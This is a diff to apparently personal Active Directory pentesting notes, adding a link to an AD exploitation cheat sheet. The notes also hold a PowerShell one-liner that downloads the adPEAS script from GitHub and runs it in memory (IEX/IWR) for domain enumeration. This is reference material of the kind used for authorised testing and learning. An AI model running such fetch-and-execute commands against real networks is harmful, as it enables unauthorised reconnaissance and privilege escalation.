@@ -1,6 +1,7 @@
 
 > First, domain controlers should be enumerated as any windows machine. Privilege escalation works the same as well (mostly). Here one can find AD specific enumeration and privilege escalation techniques.
 
+[AD Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration)
 # ADPeas
 ```powershell
 IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS
